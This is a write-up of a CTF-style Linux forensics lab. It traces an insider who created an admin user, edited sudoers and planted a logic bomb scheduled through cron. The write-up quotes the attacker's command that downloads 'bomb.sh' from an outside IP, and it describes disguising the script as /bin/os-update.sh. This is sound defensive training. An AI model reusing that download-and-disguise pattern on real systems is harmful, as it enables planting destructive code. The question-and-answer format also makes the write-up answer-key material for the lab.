# 🛠️ Disgruntled: Linux Forensics Investigation  

I investigated a suspicious incident involving a compromised Linux system. Below are the findings and the investigative process, with placeholders for screenshots to support each step.  

---

## 🖥️ Lab Setup  

- **Client Name:** CyberT  
- **Primary User Account:** cybert
- **Scenario:** Hey, kid! Good, you’re here! Not sure if you’ve seen the news, but an employee from the IT department of one of our clients (CyberT) got arrested by the police. The guy was running a successful phishing operation as a side gig. CyberT wants us to check if this person has done anything malicious to any of their assets. Get set up, grab a cup of coffee, and meet me in the conference room. 

---

## 🔍 Investigation Questions and Answers  

### 1. What is the full command used to install a package on the machine using elevated privileges?  
**Answer:** `/usr/bin/apt install dokuwiki`  
- **Steps Taken:**  
  - Queried the authorization logs with the command:  
    ```bash
    cat /var/log/auth.log* | grep -i COMMAND | grep -i install
    ```  
  - Reviewed entries for elevated privileges usage and identified the package installation command.  

![Screenshot for Question 1](https://i.imgur.com/zfhSYt1.png)

---

### 2. What was the present working directory (PWD) when the previous command was run?  
**Answer:** `/home/cybert`  
- **Steps Taken:**  
  - Checked the `PWD` value in the same log entry as the installation command.  

![Screenshot for Question 2](https://i.imgur.com/1aLJM5t.png)

---

### 3. Which user was created after the package was installed?  
**Answer:** `it-admin`  
- **Steps Taken:**  
  - Searched the logs for user creation commands:  
    ```bash
    cat /var/log/auth.log* | grep -i COMMAND | grep -i adduser
    ```  
  - Identified the newly created user account.  

![Screenshot for Question 3](https://i.imgur.com/VuBRXyc.png)

---

### 4. When was the sudoers file updated?  
**Answer:** `Dec 28 06:27`  
- **Steps Taken:**  
  - Queried the logs for `visudo` commands with the following:  
    ```bash
    cat /var/log/auth.log* | grep -i visudo
    ```  
  - Correlated timestamps with other malicious actions. This will let you see the changes done to the sudoers file. 

![Screenshot for Question 4](https://i.imgur.com/zmBc7W5.png)

---

### 5. What is the name of the script file that was opened using the "vi" text editor?  
**Answer:** `bomb.sh`  
- **Steps Taken:**  
  - Investigated logs for instances of the `vi` command:  
    ```bash
    cat /var/log/auth.log* | grep -i vi
    ```  
  - Found a suspicious file edited with `vi`.  

![Screenshot for Question 5](https://i.imgur.com/1m7C4zL.png)

---

### 6. What is the command used to create the file `bomb.sh`?  
**Answer:** `curl 10.10.158.38:8080/bomb.sh --output bomb.sh`  
- **Steps Taken:**  
  - Reviewed the `.bash_history` of the created user:  
    ```bash
    cat /home/it-admin/.bash_history
    ```  
  - Located the command used to download the malicious script.  

![Screenshot for Question 6](https://i.imgur.com/UDm0DHw.png)

---

### 7. What is the full path of the file after it was renamed and moved to a different directory?  
**Answer:** `/bin/os-update.sh`  
- **Steps Taken:**  
  - Checked the `.viminfo` file for renaming operations:  
    ```bash
    cat /home/it-admin/.viminfo | grep saveas
    ```  
  - Found the new path and name of the script.  

![Screenshot for Question 7](https://i.imgur.com/AJI3R0j.png)

---

### 8. When was the file `/bin/os-update.sh` last modified?  
**Answer:** `Dec 28 06:29`  
- **Steps Taken:**  
  - Queried the directory metadata for file modification timestamps:  
    ```bash
    ls -al /bin | grep os-update
    ```  

![Screenshot for Question 8](https://i.imgur.com/SkmKoPy.png)

---

### 9. What is the name of the file that will get created when `/bin/os-update.sh` executes?  
**Answer:** `goodbye.txt`  
- **Steps Taken:**  
  - Reviewed the contents of the script using:  
    ```bash
    cat /bin/os-update.sh
    ```  
  - Found that the script outputs `goodbye.txt`.  

![Screenshot for Question 9](https://i.imgur.com/vqIrJkM.png)

---

### 10. At what time will the malicious file trigger?  
**Answer:** `08:00 AM`  
- **Steps Taken:**  
  - Checked the system’s cron jobs with the following command:  
    ```bash
    cat /etc/crontab
    ```  
  - Noted the scheduled execution time for the malicious script.  

![Screenshot for Question 10](https://i.imgur.com/JYrY229.png)

---

## 🛠️ Tools Used  

- **Linux Command Line:** For log parsing and forensic analysis.  
- **Key Commands:** `grep`, `cat`, `ls`, `.bash_history`, `.viminfo`.  

---

## 🧠 Key Takeaways  

- Authentication logs are critical for tracking privileged actions.  
- Understanding file operations and cron jobs is vital in identifying malicious activity.  
- Linux forensic investigations require a mix of log analysis and command history inspection.


